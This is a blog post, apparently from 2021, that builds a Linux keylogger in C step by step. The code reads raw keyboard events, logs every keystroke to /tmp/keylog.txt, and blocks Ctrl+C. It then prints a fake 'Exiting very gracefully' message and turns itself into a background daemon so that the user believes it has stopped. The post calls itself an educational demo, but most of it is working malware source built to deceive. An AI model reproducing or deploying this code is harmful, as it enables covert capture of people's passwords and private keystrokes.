<!DOCTYPE html>
<html lang="en" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>Keylogger for Linux | Connected</title>
<meta name="keywords" content="linux, keylogger, C programming">
<meta name="description" content="
Developing a low level keylogger for linux using C.
">
<meta name="author" content="ayedaemon">
<link rel="canonical" href="https://ayedaemon.github.io/post/2021/02/keylogger-for-linux/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.b609c58d5c11bb90b1a54e04005d74ad1ddf22165eb79f5533967e57df9c3b50.css" integrity="sha256-tgnFjVwRu5CxpU4EAF10rR3fIhZet59VM5Z&#43;V9&#43;cO1A=" rel="preload stylesheet" as="style">
<link rel="icon" href="https://ayedaemon.github.io/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="https://ayedaemon.github.io/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="https://ayedaemon.github.io/favicon-32x32.png">
<link rel="apple-touch-icon" href="https://ayedaemon.github.io/apple-touch-icon.png">
<link rel="mask-icon" href="https://ayedaemon.github.io/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
</noscript><meta property="og:title" content="Keylogger for Linux" />
<meta property="og:description" content="
Developing a low level keylogger for linux using C.
" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://ayedaemon.github.io/post/2021/02/keylogger-for-linux/" /><meta property="article:section" content="post" />
<meta property="article:published_time" content="2021-02-02T14:47:26+05:30" />
<meta property="article:modified_time" content="2021-02-02T14:47:26+05:30" />


<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="Keylogger for Linux"/>
<meta name="twitter:description" content="
Developing a low level keylogger for linux using C.
"/>


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Posts",
      "item": "https://ayedaemon.github.io/post/"
    }, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "Keylogger for Linux",
      "item": "https://ayedaemon.github.io/post/2021/02/keylogger-for-linux/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "Keylogger for Linux",
  "name": "Keylogger for Linux",
  "description": " Developing a low level keylogger for linux using C.\n",
  "keywords": [
    "linux", "keylogger", "C programming"
  ],
  "articleBody": " Developing a low level keylogger for linux using C.\nI am putting this blog in a bottom-up approach. We’ll start with the basic program that can act as a keylogger.\nWhat is a Keylogger?? How to make one? Keylogger is a program (or a hardware sometimes) that logs all the keystrokes made by the keyboard.\nWe know that there is something in OS that listens to the keyboard events and perform actions accordingly. For example, when we press alt+tab it changes the current focus to another application/screen.\nAccording to wikipedia, in linux, the event devices generalizes all the raw input from device drivers and makes them available through character devices in /dev/input/ directory.\n(If you don’t know about character devices, think it as a real-time stream data)\nAll the event files/devices are located in /dev/input/ directory. It was very easy to figure out the file after looking at the directory structure.\nIt is pretty obvious that my keyboard event file is /dev/input/by-path/platform-i8042-serio-0-event-kbd. (For you, this may change, but it’ll have kbd in it’s name!!)\nSo I wrote a program that will continuously read data from this file and print it on screen.\nCODE - basic_keylogger.c\n#include #include #include #include #include #include int main(void) { errno = 0; struct input_event ev; //This is the keyboard event file char* kbd_path = \"/dev/input/by-path/platform-i8042-serio-0-event-kbd\"; int fd = open(kbd_path, O_RDONLY); if(fd == -1) { printf(\"Error %d\\n\", errno); exit(EXIT_FAILURE); } while (1) { read(fd, \u0026ev, sizeof(struct input_event)); //read from keyboard printf(\"%i - %i\\n\",ev.code, ev.value); } return 0; } Compile this and run it.\n## Compile gcc basic_keylogger.c -o basic_keylogger.out ## Execute it ./basic_keylogger.out This will give output something like this.\nI am not sure about what this all is. But I saw some pattern and decided to learn more on this later. The pattern here is, whenever ev.value is 1 then I am getting a ev.code unique for each key. So I decided to just filter out the data with ev.value == 1.\nCODE - basic_keylogger.c (minor modification)\n#include #include #include #include #include #include int main(void) { errno = 0; struct input_event ev; //This is the keyboard event file char* kbd_path = \"/dev/input/by-path/platform-i8042-serio-0-event-kbd\"; int fd = open(kbd_path, O_RDONLY); if(fd == -1) { printf(\"Error %d\\n\", errno); exit(EXIT_FAILURE); } while (1) { read(fd, \u0026ev, sizeof(struct input_event)); //read from keyboard if(ev.value == 1) { printf(\"%i - %i\\n\",ev.code, ev.value); } } return 0; } After again compiling and running this, I was just getting the useful data from everything.\nThis is the simple idea of making the keylogger. But there are a lot of things we haven’t done.\nMaking our keylogger more dynamic. Till now, we are using hard coded file name for the keyboard. We can make it more dynamic by searching for the kbd file in /dev/input/by-path/ and then read that file for the events. And then save the events in a file.\nFor this purpose, I have changed the working directory structure to make the project more modular.\nCODE:- basic_keylogger.c\n#include \"basic_keylogger.h\" int main(void) { errno = 0; struct input_event ev; char* kbd = get_me_a_keyboard(); // Get keyboard name char* kbd_path = concat(INPUT_EVENT_DIR, kbd); // Get complete path for keyboard int fd = open(kbd_path, O_RDONLY); if(fd == -1) { printf(\"Error %d\\n\", errno); exit(EXIT_FAILURE); } printf(\"Reading from %s\\n\",kbd_path); free(kbd_path); // free some memory while (1) { read(fd, \u0026ev, sizeof(struct input_event)); //read from keyboard if(ev.type == 1) log_in_file(ev); //log the event } return 0; } This main program includes basic_keylogger.h file - which I have used to include all the libraries and define macros.\nCODE:- basic_keylogger.h\n/* // // defining variables // */ #define INPUT_EVENT_DIR \"/dev/input/by-path/\" #define LOG_FILE \"/tmp/keylog.txt\" /* // // importing system headers // */ #include #include #include #include #include #include #include #include #include #include #include /* // // importing utility functions // */ #include \"utils/logger.c\" #include \"utils/helpers.c\" #include \"utils/keyboard.c\" Here are 3 more files included for obvious purposes.\nCODE:- utils/logger.c (logger function)\nvoid log_in_file(struct input_event ev) { printf(\"Logging\"); time_t t = time(NULL); struct tm tm = *localtime(\u0026t); FILE* fptr = fopen(LOG_FILE, \"a\"); // print( [date time] keycode keyvalue ) - keyvalue =\u003e {press; lift; long press} fprintf(fptr, \"[ %d-%02d-%02d %02d:%02d:%02d ] key %i state %i\\n\", tm.tm_year + 1900, tm.tm_mon + 1, tm.tm_mday, tm.tm_hour, tm.tm_min, tm.tm_sec, ev.code, ev.value); if(tm.tm_sec == 0) { /* Do whatever you want to do here It is like a scheduler section.*/ //fprintf(fptr, \"%s\\n\", \"1 minute check\\n\"); } fclose(fptr); printf(\" logged\\n\"); } CODE:- utils/helpers.c (now only used for concatination of 2 strings)\nchar* concat(const char *s1, const char *s2) { const size_t len1 = strlen(s1); const size_t len2 = strlen(s2); char *result = malloc(len1 + len2 + 1); // +1 for the null-terminator // in real code you would check for errors in malloc here memcpy(result, s1, len1); memcpy(result + len1, s2, len2 + 1); // +1 to copy the null-terminator return result; } CODE:- utils/keyboard.c (get keyboard device from the directory)\nchar* get_me_a_keyboard() { struct dirent **namelist; int n=0,i=0; n = scandir(INPUT_EVENT_DIR, \u0026namelist, NULL, alphasort); // read the directory for the files if(n==-1) { // perror(\"Scandir Failed!!\\n\"); exit(EXIT_FAILURE); } if(n\u003c=2){ // perror(\"No devices found!!\\n\"); exit(EXIT_FAILURE); } // printf(\"[ * ] %d Devices found !!\\n\",n-2); for(i=0; id_name == \".\" || namelist[i]-\u003ed_name == \"..\") // skip for . and .. continue; else if(strstr(namelist[i]-\u003ed_name,\"kbd\")) // check if the filename has \"kbd\" (keyboard) in it break; // if yes, do not look further return namelist[i]-\u003ed_name; // and return keyboard file name to caller function } After compiling and executing the binary. We get logging - logged message on the terminal and the actual log is being stored in /tmp/keylog.txt file - as mentioned in basic_keylogger.h file.\nWhat next? …Getting evil!! We can close the program by pressing ctrl+c or send it to background by ctrl+z. These key combinations send a signal to the process to close. And we can handle these signals in our code…. using signal.h header file. (import this in the code.)\nCODE - basic_keylogger.c (added signal handlers)\n#include \"basic_keylogger.h\" // Signal handler function void signal_handler(int sig) { printf(\"Sorry, But I won't exit.\\n\"); } int main(void) { errno = 0; struct sigaction signal; // create signal action struct signal.sa_handler = signal_handler; // initialize the handler function sigaction(SIGINT, \u0026signal, NULL); // assign the signal action to a specific signal struct input_event ev; char* kbd = get_me_a_keyboard(); // Get keyboard name char* kbd_path = concat(INPUT_EVENT_DIR, kbd); // Get complete path for keyboard int fd = open(kbd_path, O_RDONLY); if(fd == -1) { printf(\"Error %d\\n\", errno); exit(EXIT_FAILURE); } printf(\"Reading from %s\\n\",kbd_path); free(kbd_path); // free some memory while (1) { read(fd, \u0026ev, sizeof(struct input_event)); //read from keyboard if(ev.type == 1) log_in_file(ev); //log the event } return 0; } As expected with this code, I am unable to close the program with ctrl+c. Whenever I am pressing it, it gives me a message that “Sorry, But I won’t exit.”\nThis program can only be terminated with kill signal. See here to know how.\nGoing undercover What if we trick user with a false closing message and go undercover (Daemon process).\nThe idea is to create the process as a daemon process whenever the user press ctrl+c. Also give the user a good message so that he actually believes that the process has closed and then probably he’ll not check for the running processes to find if it actually has closed.\nTo achieve this, I’ll make slight changes to my signal_handler function and add a daemonize function to create a daemon process. If you have already not seen what a daemon process is and how to create one - Look here.\nCODE:- basic_keylogger.c (changed the signal_handler function)\n#include \"basic_keylogger.h\" // Signal handler function void signal_handler(int sig) { printf(\"Exiting very gracefully :)\"); //fake message daemonize(); // Go undercover } int main(void) { errno = 0; struct sigaction signal; // create signal action struct signal.sa_handler = signal_handler; // initialize the handler function sigaction(SIGINT, \u0026signal, NULL); // assign the signal action to a specific signal struct input_event ev; char* kbd = get_me_a_keyboard(); // Get keyboard name char* kbd_path = concat(INPUT_EVENT_DIR, kbd); // Get complete path for keyboard int fd = open(kbd_path, O_RDONLY); if(fd == -1) { printf(\"Error %d\\n\", errno); exit(EXIT_FAILURE); } printf(\"Reading from %s\\n\",kbd_path); free(kbd_path); // free some memory while (1) { read(fd, \u0026ev, sizeof(struct input_event)); //read from keyboard if(ev.type == 1) log_in_file(ev); //log the event } return 0; } Here, I am using daemonize funtion which is defined in ./utils/daemonize.c and imported in basic_keylogger.h.\nCODE:- daemonize.c\nint daemonize() { pid_t pid, sid; /* Fork off the parent process */ pid = fork(); if (pid \u003c 0) { exit(EXIT_FAILURE); } /* If we got a good PID, then we can exit the parent process. */ if (pid \u003e 0) { // Child can continue to run even after the parent has finished executing exit(EXIT_SUCCESS); } /* Change the file mode mask */ umask(0); /* Open any logs here */ /* Create a new SID for the child process */ sid = setsid(); if (sid \u003c 0) { /* Log the failure */ exit(EXIT_FAILURE); } /* Change the current working directory */ if ((chdir(\"/\")) \u003c 0) { /* Log the failure */ exit(EXIT_FAILURE); } /* Close out the standard file descriptors */ //Because daemons generally dont interact directly with user so there is no need of keeping these open close(STDIN_FILENO); close(STDOUT_FILENO); close(STDERR_FILENO); return(pid); } After compiling and executing this code. We get a decent exit message like this.\nBut we can check from the /tmp/keylog.txt file that the program is still adding key events to the file. Use tail -f /tmp/keylog.txt command to check appending logs.\nYou can look for the process using ps -A | grep 'your_binary_name' command to get the process ID of the daemon keylogger running behind the scene. And then kill it by using kill -9 .\nConclusion. You can take this blog as an educational purpose demo that even the least suspecting program from any untrusted source can be malicious and can do a lot of things you have not expected it to do. We can create simple programs, that can read the whole file system to know what programs you use.. get the files with sensitive information.. passwords stored in the browsers.. setup a trojan.. and what not. Also with small modifications, I can send all the logs created locally to a remote server.\nThis program is only tested in a bare-metal linux system. This can’t work on windows (because they have different system calls and API to work) and this is also not working in VM for some reason which I am trying to figure out why. If you have any knowledge regarding this, please feel free to reach out and help me to understand the problem.\nAll this code is present in github repo here -\u003e (https://github.com/ayedaemon/C-practice/tree/master/lin-c/keylogger)\n",
  "wordCount" : "1806",
  "inLanguage": "en",
  "datePublished": "2021-02-02T14:47:26+05:30",
  "dateModified": "2021-02-02T14:47:26+05:30",
  "author":[{
    "@type": "Person",
    "name": "ayedaemon"
  }],
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://ayedaemon.github.io/post/2021/02/keylogger-for-linux/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "Connected",
    "logo": {
      "@type": "ImageObject",
      "url": "https://ayedaemon.github.io/favicon.ico"
    }
  }
}
</script>
</head>

<body class=" dark" id="top">

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="https://ayedaemon.github.io/" accesskey="h" title="Connected (Alt + H)">Connected</a>
            <div class="logo-switches">
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="https://ayedaemon.github.io/post/" title="Archives">
                    <span>Archives</span>
                </a>
            </li>
            <li>
                <a href="https://ayedaemon.github.io/series/" title="Series">
                    <span>Series</span>
                </a>
            </li>
            <li>
                <a href="https://ayedaemon.github.io/tags/" title="Tags">
                    <span>Tags</span>
                </a>
            </li>
            <li>
                <a href="https://ayedaemon.github.io/search/" title="Search (Alt &#43; /)" accesskey=/>
                    <span>Search</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    
    <h1 class="post-title entry-hint-parent">
      Keylogger for Linux
    </h1>
    <div class="post-meta"><span title='2021-02-02 14:47:26 +0530 +0530'>February 2, 2021</span>&nbsp;·&nbsp;9 min&nbsp;·&nbsp;1806 words&nbsp;·&nbsp;ayedaemon&nbsp;|&nbsp;<a href="https://github.com/ayedaemon/ayedaemon.github.io/content/post/2021/02/keylogger-for-linux.md" rel="noopener noreferrer" target="_blank">Suggest Changes</a>

</div>
  </header> <div class="toc">
    <details >
        <summary accesskey="c" title="(Alt + C)">
            <span class="details">Table of Contents</span>
        </summary>

        <div class="inner"><ul>
                <li>
                    <a href="#what-is-a-keylogger-how-to-make-one" aria-label="What is a Keylogger?? How to make one?">What is a Keylogger?? How to make one?</a></li>
                <li>
                    <a href="#making-our-keylogger-more-dynamic" aria-label="Making our keylogger more dynamic.">Making our keylogger more dynamic.</a></li>
                <li>
                    <a href="#what-next-getting-evil" aria-label="What next? &hellip;Getting evil!!">What next? &hellip;Getting evil!!</a></li>
                <li>
                    <a href="#going-undercover" aria-label="Going undercover">Going undercover</a></li>
                <li>
                    <a href="#conclusion" aria-label="Conclusion.">Conclusion.</a>
                </li>
            </ul>
        </div>
    </details>
</div>

  <div class="post-content"><blockquote>
<p>Developing a low level keylogger for linux using C.</p>
</blockquote>
<p>I am putting this blog in a bottom-up approach. We&rsquo;ll start with the basic program that can act as a keylogger.</p>
<h3 id="what-is-a-keylogger-how-to-make-one">What is a Keylogger?? How to make one?<a hidden class="anchor" aria-hidden="true" href="#what-is-a-keylogger-how-to-make-one">#</a></h3>
<blockquote>
<p>Keylogger is a program (or a hardware sometimes) that logs all the keystrokes made by the keyboard.</p>
</blockquote>
<p>We know that there is something in OS that listens to the keyboard events and perform actions accordingly. For example, when we press <em>alt+tab</em> it changes the current focus to another application/screen.</p>
<p>According to wikipedia, in linux, the <a href="https://en.wikipedia.org/wiki/Evdev">event devices</a> generalizes all the raw input from device drivers and makes them available through character devices in <code>/dev/input/</code> directory.</p>
<p><em>(If you don&rsquo;t know about <code>character devices</code>, think it as a real-time stream data)</em></p>
<p>All the event files/devices are located in <code>/dev/input/</code> directory. It was very easy to figure out the file after looking at the directory structure.</p>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/640/1*X9cxcchj9h9vGjHKAtG_mg.png" alt="directory-structure"  />
</p>
<p>It is pretty obvious that my keyboard event file is <code>/dev/input/by-path/platform-i8042-serio-0-event-kbd</code>. (For you, this may change, but it&rsquo;ll have <strong>kbd</strong> in it&rsquo;s name!!)</p>
<p>So I wrote a program that will continuously read data from this file and print it on screen.</p>
<p>CODE - <code>basic_keylogger.c</code></p>
<pre tabindex="0"><code>#include &lt;errno.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;linux/input.h&gt;
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;

int main(void) {
  errno = 0;
  struct input_event ev;
  //This is the keyboard event file
  char* kbd_path = &#34;/dev/input/by-path/platform-i8042-serio-0-event-kbd&#34;;
  int fd = open(kbd_path, O_RDONLY);
  if(fd == -1)
  {
    printf(&#34;Error %d\n&#34;, errno);
    exit(EXIT_FAILURE);
  }

  while (1)
  {
    read(fd, &amp;ev, sizeof(struct input_event)); //read from keyboard
    printf(&#34;%i - %i\n&#34;,ev.code, ev.value);
  }

  return 0;
}
</code></pre><p>Compile this and run it.</p>
<pre tabindex="0"><code>## Compile

gcc basic_keylogger.c -o basic_keylogger.out

## Execute it

./basic_keylogger.out
</code></pre><p>This will give output something like this.</p>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/640/1*Y-Z4wh_4BDSNLf6v1_NF8Q.png" alt="output1"  />
</p>
<p>I am not sure about what this all is. But I saw some pattern and decided to learn more on this later. The pattern here is, whenever <code>ev.value</code> is <code>1</code> then I am getting a <code>ev.code</code> unique for each key. So I decided to just filter out the data with <code>ev.value == 1</code>.</p>
<p>CODE - <code>basic_keylogger.c</code> (minor modification)</p>
<pre tabindex="0"><code>#include &lt;errno.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;linux/input.h&gt;
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;

int main(void) {
  errno = 0;
  struct input_event ev;
  //This is the keyboard event file
  char* kbd_path = &#34;/dev/input/by-path/platform-i8042-serio-0-event-kbd&#34;;
  int fd = open(kbd_path, O_RDONLY);
  if(fd == -1)
  {
    printf(&#34;Error %d\n&#34;, errno);
    exit(EXIT_FAILURE);
  }

  while (1)
  {
    read(fd, &amp;ev, sizeof(struct input_event)); //read from keyboard
    if(ev.value == 1)
    {
      printf(&#34;%i - %i\n&#34;,ev.code, ev.value);
    }
  }

  return 0;
}
</code></pre><p>After again compiling and running this, I was just getting the useful data from everything.</p>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/640/1*zRFTkTAQGKSMSspmAxqCjg.png" alt="useful-raw-data"  />
</p>
<p>This is the simple idea of making the keylogger. But there are a lot of things we haven&rsquo;t done.</p>
<h3 id="making-our-keylogger-more-dynamic">Making our keylogger more dynamic.<a hidden class="anchor" aria-hidden="true" href="#making-our-keylogger-more-dynamic">#</a></h3>
<p>Till now, we are using hard coded file name for the keyboard. We can make it more dynamic by searching for the <strong>kbd</strong> file in <code>/dev/input/by-path/</code> and then read that file for the events. And then save the events in a file.</p>
<p>For this purpose, I have changed the working directory structure to make the project more modular.</p>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/640/1*2VyFdbneXRLZPXuScZGCPg.png" alt=""  />
</p>
<p>CODE:- <code>basic_keylogger.c</code></p>
<pre tabindex="0"><code>#include &#34;basic_keylogger.h&#34;


int main(void) {
  errno = 0;
  struct input_event ev;
  char* kbd = get_me_a_keyboard(); // Get keyboard name
  char* kbd_path = concat(INPUT_EVENT_DIR, kbd); // Get complete path for keyboard

  int fd = open(kbd_path, O_RDONLY);
  if(fd == -1)
  {
    printf(&#34;Error %d\n&#34;, errno);
    exit(EXIT_FAILURE);
  }
  printf(&#34;Reading from %s\n&#34;,kbd_path);
  free(kbd_path); // free some memory
  while (1)
  {
    read(fd, &amp;ev, sizeof(struct input_event)); //read from keyboard
    if(ev.type == 1)
      log_in_file(ev); //log the event
  }
  return 0;
}
</code></pre><p>This main program <em>includes</em> <code>basic_keylogger.h</code> file - which I have used to include all the libraries and <em>define</em> macros.</p>
<p>CODE:- <code>basic_keylogger.h</code></p>
<pre tabindex="0"><code>
/*
//
// defining variables
//
*/

#define INPUT_EVENT_DIR &#34;/dev/input/by-path/&#34;
#define LOG_FILE &#34;/tmp/keylog.txt&#34;

/*
//
// importing system headers
//
*/

#include &lt;dirent.h&gt;
#include &lt;errno.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;linux/input.h&gt;
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;sys/stat.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;time.h&gt;
#include &lt;unistd.h&gt;

/*
//
// importing utility functions
//
*/

#include &#34;utils/logger.c&#34;
#include &#34;utils/helpers.c&#34;
#include &#34;utils/keyboard.c&#34;
</code></pre><p>Here are 3 more files included for obvious purposes.</p>
<p>CODE:- <code>utils/logger.c</code> (logger function)</p>
<pre tabindex="0"><code>void log_in_file(struct input_event ev)
{
  printf(&#34;Logging&#34;);
    time_t t = time(NULL);
    struct tm tm = *localtime(&amp;t);
    FILE* fptr = fopen(LOG_FILE, &#34;a&#34;);
    // print( [date time] keycode keyvalue ) - keyvalue =&gt; {press; lift; long press}
    fprintf(fptr, &#34;[ %d-%02d-%02d %02d:%02d:%02d ]   key %i state %i\n&#34;, tm.tm_year + 1900, tm.tm_mon + 1, tm.tm_mday, tm.tm_hour, tm.tm_min, tm.tm_sec, ev.code, ev.value);
    if(tm.tm_sec == 0)
    {
      /* Do whatever you want to do here
        It is like a scheduler section.*/

      //fprintf(fptr, &#34;%s\n&#34;, &#34;1 minute check\n&#34;);
    }
    fclose(fptr);
    printf(&#34;  logged\n&#34;);
}
</code></pre><p>CODE:- <code>utils/helpers.c</code> (now only used for concatination of 2 strings)</p>
<pre tabindex="0"><code>char* concat(const char *s1, const char *s2)
{
    const size_t len1 = strlen(s1);
    const size_t len2 = strlen(s2);
    char *result = malloc(len1 + len2 + 1); // +1 for the null-terminator
    // in real code you would check for errors in malloc here
    memcpy(result, s1, len1);
    memcpy(result + len1, s2, len2 + 1); // +1 to copy the null-terminator
    return result;
}
</code></pre><p>CODE:- <code>utils/keyboard.c</code> (get keyboard device from the directory)</p>
<pre tabindex="0"><code>char* get_me_a_keyboard()
{
  struct dirent **namelist;
  int n=0,i=0;
  n = scandir(INPUT_EVENT_DIR, &amp;namelist, NULL, alphasort); // read the directory for the files
  if(n==-1)
  {
    // perror(&#34;Scandir Failed!!\n&#34;);
    exit(EXIT_FAILURE);
  }
  if(n&lt;=2){
    // perror(&#34;No devices found!!\n&#34;);
    exit(EXIT_FAILURE);
  }
  // printf(&#34;[ * ] %d Devices found !!\n&#34;,n-2);
  for(i=0; i&lt;n; i++)
    if( namelist[i]-&gt;d_name == &#34;.&#34; || namelist[i]-&gt;d_name == &#34;..&#34;) // skip for . and ..
      continue;
    else if(strstr(namelist[i]-&gt;d_name,&#34;kbd&#34;)) // check if the filename has &#34;kbd&#34; (keyboard) in it
      break;  // if yes, do not look further

  return namelist[i]-&gt;d_name; // and return keyboard file name to caller function
}
</code></pre><p>After compiling and executing the binary. We get <strong>logging - logged</strong> message on the terminal and the actual log is being stored in <code>/tmp/keylog.txt</code> file - as mentioned in <code>basic_keylogger.h</code> file.</p>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/640/1*ikK7hBwfMweto2rYqhaBFg.png" alt=""  />
</p>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/640/1*8wYAQGNMNS7TymthEnSb6g.png" alt=""  />
</p>
<hr>
<h3 id="what-next-getting-evil">What next? &hellip;Getting evil!!<a hidden class="anchor" aria-hidden="true" href="#what-next-getting-evil">#</a></h3>
<p>We can close the program by pressing <em>ctrl+c</em> or send it to background by <em>ctrl+z</em>. These key combinations send a signal to the process to close.
And we can handle these signals in our code&hellip;. using <code>signal.h</code> header file. (import this in the code.)</p>
<p>CODE - <code>basic_keylogger.c</code> (added signal handlers)</p>
<pre tabindex="0"><code>#include &#34;basic_keylogger.h&#34;

// Signal handler function
void signal_handler(int sig) {
  printf(&#34;Sorry, But I won&#39;t exit.\n&#34;);
}

int main(void) {
  errno = 0;

  struct sigaction signal; // create signal action struct
  signal.sa_handler = signal_handler; // initialize the handler function
  sigaction(SIGINT, &amp;signal, NULL); // assign the signal action to a specific signal

  struct input_event ev;
  char* kbd = get_me_a_keyboard(); // Get keyboard name
  char* kbd_path = concat(INPUT_EVENT_DIR, kbd); // Get complete path for keyboard

  int fd = open(kbd_path, O_RDONLY);
  if(fd == -1)
  {
    printf(&#34;Error %d\n&#34;, errno);
    exit(EXIT_FAILURE);
  }
  printf(&#34;Reading from %s\n&#34;,kbd_path);
  free(kbd_path); // free some memory
  while (1)
  {
    read(fd, &amp;ev, sizeof(struct input_event)); //read from keyboard
    if(ev.type == 1)
      log_in_file(ev); //log the event
  }
  return 0;
}
</code></pre><p>As expected with this code, I am unable to close the program with <em>ctrl+c</em>. Whenever I am pressing it, it gives me a message that <strong>&ldquo;Sorry, But I won&rsquo;t exit.&rdquo;</strong></p>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/640/1*882rJMJZjAMEce-EupTVhg.png" alt=""  />
</p>
<p>This program can only be terminated with <strong>kill</strong> signal. See <a href="https://www.linux.com/training-tutorials/how-kill-process-command-line/">here</a> to know how.</p>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/640/1*atvzfHlH5gEBaNw3PcoDgA.png" alt=""  />
</p>
<h3 id="going-undercover">Going undercover<a hidden class="anchor" aria-hidden="true" href="#going-undercover">#</a></h3>
<p>What if we trick user with a false closing message and go undercover <a href="https://notes.shichao.io/apue/ch13/">(Daemon process)</a>.</p>
<p>The idea is to create the process as a daemon process whenever the user press <em>ctrl+c</em>. Also give the user a good message so that he actually believes that the process has closed and then probably he&rsquo;ll not check for the running processes to find if it actually has closed.</p>
<p>To achieve this, I&rsquo;ll make slight changes to my <code>signal_handler</code> function and add a <code>daemonize</code> function to create a daemon process. If you have already not seen what a daemon process is and how to create one - Look <a href="https://notes.shichao.io/apue/ch13/">here</a>.</p>
<p>CODE:- <code>basic_keylogger.c</code> (changed the signal_handler function)</p>
<pre tabindex="0"><code>#include &#34;basic_keylogger.h&#34;


// Signal handler function
void signal_handler(int sig) {
  printf(&#34;Exiting very gracefully :)&#34;); //fake message
  daemonize(); // Go undercover
}

int main(void) {
  errno = 0;

  struct sigaction signal; // create signal action struct
  signal.sa_handler = signal_handler; // initialize the handler function
  sigaction(SIGINT, &amp;signal, NULL); // assign the signal action to a specific signal

  struct input_event ev;
  char* kbd = get_me_a_keyboard(); // Get keyboard name
  char* kbd_path = concat(INPUT_EVENT_DIR, kbd); // Get complete path for keyboard

  int fd = open(kbd_path, O_RDONLY);
  if(fd == -1)
  {
    printf(&#34;Error %d\n&#34;, errno);
    exit(EXIT_FAILURE);
  }
  printf(&#34;Reading from %s\n&#34;,kbd_path);
  free(kbd_path); // free some memory
  while (1)
  {
    read(fd, &amp;ev, sizeof(struct input_event)); //read from keyboard
    if(ev.type == 1)
      log_in_file(ev); //log the event
  }
  return 0;
}
</code></pre><p>Here, I am using <code>daemonize</code> funtion which is defined in <code>./utils/daemonize.c</code> and imported in <code>basic_keylogger.h</code>.</p>
<p>CODE:- <code>daemonize.c</code></p>
<pre tabindex="0"><code>int daemonize()
{
    pid_t pid, sid;

    /* Fork off the parent process */
    pid = fork();
    if (pid &lt; 0) {
        exit(EXIT_FAILURE);
    }
    /* If we got a good PID, then
        we can exit the parent process. */
    if (pid &gt; 0) { // Child can continue to run even after the parent has finished executing
        exit(EXIT_SUCCESS);
    }

    /* Change the file mode mask */
    umask(0);

    /* Open any logs here */

    /* Create a new SID for the child process */
    sid = setsid();
    if (sid &lt; 0) {
        /* Log the failure */
        exit(EXIT_FAILURE);
    }

    /* Change the current working directory */
    if ((chdir(&#34;/&#34;)) &lt; 0) {
        /* Log the failure */
        exit(EXIT_FAILURE);
    }

    /* Close out the standard file descriptors */
    //Because daemons generally dont interact directly with user so there is no need of keeping these open
    close(STDIN_FILENO);
    close(STDOUT_FILENO);
    close(STDERR_FILENO);

    return(pid);
}
</code></pre><p>After compiling and executing this code. We get a decent exit message like this.</p>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/640/1*y_eJXDhm9j1vkrAzajJUEA.png" alt=""  />
</p>
<p>But we can check from the <strong>/tmp/keylog.txt</strong> file that the program is still adding key events to the file. Use <code>tail -f /tmp/keylog.txt</code> command to check appending logs.</p>
<p>You can look for the process using <code>ps -A | grep 'your_binary_name'</code> command to get the process ID of the daemon keylogger running behind the scene. And then kill it by using <code>kill -9 &lt;processID&gt;</code>.</p>
<hr>
<h3 id="conclusion">Conclusion.<a hidden class="anchor" aria-hidden="true" href="#conclusion">#</a></h3>
<p>You can take this blog as an educational purpose demo that even the least suspecting program from any untrusted source can be malicious and can do a lot of things you have not expected it to do.
We can create simple programs, that can read the whole file system to know what programs you use.. get the files with sensitive information.. passwords stored in the browsers.. setup a trojan.. and what not.
Also with small modifications, I can send all the logs created locally to a remote server.</p>
<p>This program is only tested in a bare-metal linux system. This can&rsquo;t work on windows (because they have different system calls and API to work) and this is also not working in VM for some reason which I am trying to figure out why. If you have any knowledge regarding this, please feel free to reach out and help me to understand the problem.</p>
<p>All this code is present in github repo here -&gt; (<a href="https://github.com/ayedaemon/C-practice/tree/master/lin-c/keylogger">https://github.com/ayedaemon/C-practice/tree/master/lin-c/keylogger</a>)</p>

  </div>

  <footer class="post-footer">
    <ul class="post-tags">
      <li><a href="https://ayedaemon.github.io/tags/linux/">Linux</a></li>
      <li><a href="https://ayedaemon.github.io/tags/keylogger/">keylogger</a></li>
      <li><a href="https://ayedaemon.github.io/tags/c-programming/">C programming</a></li>
    </ul>
  </footer>
</article>
    </main>
    
<footer class="footer">
    <span>&copy; 2024 <a href="https://ayedaemon.github.io/">Connected</a></span>
    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
